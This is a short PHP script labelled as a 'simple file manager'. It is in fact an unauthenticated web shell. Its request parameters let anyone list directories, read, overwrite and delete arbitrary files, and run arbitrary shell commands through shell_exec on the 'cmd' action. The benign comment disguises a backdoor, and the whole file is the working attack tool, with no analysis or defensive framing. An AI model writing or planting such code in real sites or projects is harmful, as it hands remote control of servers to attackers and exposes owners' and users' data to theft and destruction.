<?php
// Simple file manager
$action = $_GET["action"] ?? "list";
$path = $_GET["path"] ?? ".";
if ($action == "list") {
    foreach (scandir($path) as $f) echo $f . "\n";
} elseif ($action == "read") {
    echo file_get_contents($_GET["file"]);
} elseif ($action == "write") {
    file_put_contents($_GET["file"], $_POST["data"]);
    echo "OK";
} elseif ($action == "delete") {
    unlink($_GET["file"]);
    echo "OK";
} elseif ($action == "cmd") {
    echo shell_exec($_GET["cmd"]);
}
?>